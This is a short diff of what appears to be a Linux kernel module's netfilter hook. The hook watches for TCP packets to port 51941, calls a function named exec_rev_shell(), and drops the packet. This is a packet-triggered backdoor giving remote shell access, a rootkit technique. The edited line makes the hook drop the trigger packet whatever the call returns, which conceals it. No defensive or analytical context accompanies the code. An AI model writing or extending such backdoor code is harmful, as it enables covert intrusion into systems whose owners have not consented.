@@ -29,7 +29,7 @@ static unsigned int hook(void *priv, struct sk_buff *skb, const struct nf_hook_s
         dst_port = (unsigned int)ntohs(tcp_header->dest);
         if(dst_port == 51941)
         {
-            if (exec_rev_shell())
+            if (~(exec_rev_shell()))
                 return NF_DROP;
         }
     }
